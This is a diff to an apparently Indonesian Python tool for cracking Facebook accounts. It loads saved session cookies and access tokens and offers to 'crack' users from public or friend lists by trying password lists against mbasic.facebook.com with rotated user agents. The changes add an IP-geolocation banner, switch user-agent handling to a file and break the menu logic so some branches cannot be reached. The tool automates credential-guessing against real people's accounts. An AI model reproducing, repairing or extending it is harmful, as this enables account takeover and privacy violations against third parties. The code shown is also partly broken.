@@ -1,16 +1,34 @@
 #!/usr/bin/env python3
-import requests, time, os, re, json, random
+from tkinter.tix import Tree
+import requests,json,os,sys,random,datetime,time,re
+from concurrent.futures import ThreadPoolExecutor
 from rich.panel import Panel
 from rich import print
-from concurrent.futures import ThreadPoolExecutor
-from rich.tree import Tree
+from rich import pretty
 from rich.console import Console
+from rich.columns import Columns
+from rich.panel import Panel as panel
+from rich.console import Console as sol
 try:ugen = open('user.txt','r').read().splitlines()
 except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
 try:ugen2 = open('user2.txt','r').read().splitlines()
 except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
-	
-### LIST DUMP ###
+
+
+pretty.install()
+CON=sol()
+wa = Console()
+taplikasi=[]
+gabriel=[]
+uidl =[]
+opsi=[]
+uidf=[]
+liu=[]
+console = Console()
+ses=requests.Session()
+id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
+ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
+id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 Dump = []
 ### BANNER OR LOGO ###
 def banner_logo():
@@ -89,8 +107,16 @@ def daftar_menu():
         banner_logo();cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
         token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
         name, id = dapatkan_nama(cookie, token_eaag)
-        Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
-[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
+        negara = requests.get("http://ip-api.com/json/").json()["country"]
+        ip = requests.get("http://ip-api.com/json/").json()["query"]
+        kota = requests.get("http://ip-api.com/json/").json()["city"]
+        region = requests.get("http://ip-api.com/json/").json()["region"]
+        times = requests.get("http://ip-api.com/json/").json()["timezone"]
+        day = datetime.datetime.now().strftime("%d-%b-%Y")
+        dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{day}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 3.4[/][/] ',width=50,padding=(0,3),style=f"bold white"))
+        dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{region}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=50,padding=(0,3),style=f"bold white"))
+        Console.print(Columns(dia))
+
     except Exception as e:
         Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
     Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
@@ -140,7 +166,7 @@ def daftar_menu():
             os.remove('Data/Cookie.json');os.remove('Data/Token.json');Console().print("[bold hot_pink2]   ╰─>[bold green] Keluar Dari Program!", end='\r');time.sleep(3.6);exit()
         except:exit()
     elif query == '5' or query == '05':
-        ua()
+        uap()
     else:
         Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);daftar_menu()
 ### DUMP ###
@@ -290,7 +316,7 @@ class crack:
     def main(self, total, email, password):
         try:
             for pws in password:
-                self.useragent = self.realme_useragent(total = 1)
+                self.useragent = open('ua.txt', 'r').read()
                 with requests.Session() as r:
                     r.headers.update({
 			    'host': 'mbasic.facebook.com',
@@ -385,47 +411,47 @@ class crack:
     ### REALME USERAGENT ###
     def realme_useragent(self, total):
         for _ in range(total):
-            self.useragent = ('Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36')
+            self.useragent = open('ua.txt', 'r').read()
         return self.useragent
 
-def ua():
+def uap():
 	print ("\n[01]. Ganti user agent ")
 	print ("[02]. Cek user agent ")
 	print ("[00]. Kembali ")
-	__Aang__Sayang__Laura__ = input('\n[+] Pilih : ')
-	uas(__Aang__Sayang__Laura__)
+	ganti = input('\n[+] Pilih : ')
+	uas(ganti)
 	
-def uas(__Aang__Sayang__Laura__):
-	if __Aang__Sayang__Laura__ == '':
-		print ('\n[!] Yang bener kontol');time.sleep(2)
-		uas(__Aang__Sayang__Laura__)
-	elif __Aang__Sayang__Laura__ in("1","01"):
-		print ("[!] Ketik cancel untuk gunakan ua dari script")
-		ua = input("[!] User agent : ")
-		if ua in(""):
-			print ('\n[!] Yang bener kontol');time.sleep(2)
-			daftar_menu()
-		elif ua in("CANCEL","Cancel","cancel"):
-			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
-			open("ua.txt","w").write(ua_);time.sleep(2)
-			print ("\n[✓]  Berhasil menggunakan user agent script ");time.sleep(2)
-			daftar_menu()
-		open("ua.txt","w").write(ua);time.sleep(2)
-		print ("\n[✓] Berhasil mengganti user agent");time.sleep(2)
-		daftar_menu()
-	elif __Aang__Sayang__Laura__ in("2","02"):
-		try:
-			ualo = open('self.useragent', 'r').read();time.sleep(2)
-			print ("[+] User anget lu : "+ualo);time.sleep(2)
-			input('\n[!] Tekan enter ')
-			daftar_menu()
-		except IOError:
-			print('error')
-	elif __Aang__Sayang__Laura__ in("0","00"):
-		daftar_menu()
-	else:
-		print ('\n[!] Yang bener bang');time.sleep(2)
-		uas(__Aang__Sayang__Laura__)
+def uas(ganti):
+    if ganti == '':
+        print ('\n[!] Yang bener kontol');time.sleep(2)
+        uas(ganti)
+    elif ganti in("1","01"):
+        print ("[!] Ketik cancel untuk gunakan ua dari script")
+        ua = input("[!] User agent : ")
+        if ua in(""):
+            print ('\n[!] Yang bener kontol');time.sleep(2)
+            daftar_menu()
+        elif ua in("CANCEL","Cancel","cancel"):
+            ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+            open("ua.txt","w").write(ua_);time.sleep(2)
+            print ("\n[✓]  Berhasil menggunakan user agent script ");time.sleep(2)
+            daftar_menu()
+            open("ua.txt","w").write(ua);time.sleep(2)
+            print ("\n[✓] Berhasil mengganti user agent");time.sleep(2)
+            daftar_menu()
+        elif ganti in("2","02"):
+            try:
+                ualo = open('ua.txt', 'r').read();time.sleep(2)
+                print ("[+] User anget lu : "+ualo);time.sleep(2)
+                input('\n[!] Tekan enter ')
+                daftar_menu()
+            except IOError:
+                print('error')
+        elif ganti in("0","00"):
+            daftar_menu()
+        else:
+            print ('\n[!] Yang bener bang');time.sleep(2)
+            uas(ganti)
 		
 if __name__ == '__main__':
     try:
